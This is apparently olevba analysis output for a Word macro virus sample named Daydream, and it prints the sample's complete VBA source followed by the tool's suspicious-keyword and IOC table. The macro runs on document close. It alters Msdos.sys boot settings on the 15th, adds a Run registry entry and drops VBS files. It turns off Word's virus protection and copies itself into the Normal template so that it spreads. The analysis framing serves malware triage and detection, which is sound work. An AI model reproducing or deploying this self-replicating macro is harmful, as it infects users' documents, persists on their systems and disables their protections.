olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Daydream-3cf2888e3c5ecc33ec7e2052696fc73deb39f978
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Daydream-3cf2888e3c5ecc33ec7e2052696fc73deb39f978 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
If Day(Now) = "15" Then Dream = 1 Else Dream = 0
If Dream = 1 Then
SetAttr "C:\Msdos.sys", vbNormal
System.PrivateProfileString("C:\Msdos.sys", "Options", "BootGUI") = "0"
SetAttr "C:\Msdos.sys", vbSystem + vbHidden + vbReadOnly
End If
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "") = "C:\WINDOWS\SYSTEM\Daydream.vbs"
ActiveDocument.VBProject.VBComponents.Item(1).Export ("C:\WINDOWS\SYSTEM\Daydream.dll")
Open "C:\WINDOWS\SYSTEM\Daydream.vbs" For Output As #1
Print #1, "Set Daydream = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "Daydream.Options.VirusProtection = False"
Print #1, "Daydream.Options.SaveNormalPrompt = False"
Print #1, "For x = 1 To Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\SYSTEM\Daydream.sys" & Chr(34) & ")"
Print #1, "Daydream.Application.Quit"
Close #1
Open "C:\WINDOWS\SYSTEM\Daydream.sys" For Output As #1
Print #1, "Private Sub Document_Open()"
Print #1, "With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule"
Print #1, "For x = 1 to ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, ".DeleteLines 1"
Print #1, "Next"
Print #1, "End With"
Print #1, "ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\SYSTEM\Daydream.dll" & Chr(34) & ")"
Print #1, "For x = 1 To ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find(" & Chr(34) & "Private Sub Document_Close()" & Chr(34) & ", 1, 1, 1, 30, True, True, True) = False Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "End Sub"
Close #1
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
'.,.,.,.,.,.,.,.,.,.,.,.
'Daydream By Lys KovicK
';';';';';';';';';';';';
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Daydream.vbs        |Executable file name                         |
|IOC       |Daydream.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

